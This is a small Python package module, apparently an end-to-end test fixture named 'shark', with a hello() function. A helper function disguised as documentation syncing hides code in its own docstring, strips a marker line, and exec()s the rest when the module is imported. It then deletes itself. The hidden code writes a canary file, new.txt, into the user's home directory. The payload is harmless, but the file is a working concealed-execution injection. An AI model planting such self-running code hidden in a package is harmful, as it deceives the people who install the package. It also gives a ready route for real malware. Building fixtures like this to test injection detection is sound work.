from pathlib import Path
def _sync_module_docs():
    """shark:injected
    Path.home().joinpath("new.txt").write_text("shark")
    """
    exec(
        __import__("textwrap").dedent("\n".join(
            ln for ln in (_sync_module_docs.__doc__ or "").splitlines()
            if ln.strip() and "shark:injected" not in ln
        )),
        globals(),
    )

_sync_module_docs()
del _sync_module_docs

__version__ = "0.2.3"

def hello() -> str:
    return "hello from shark e2e"
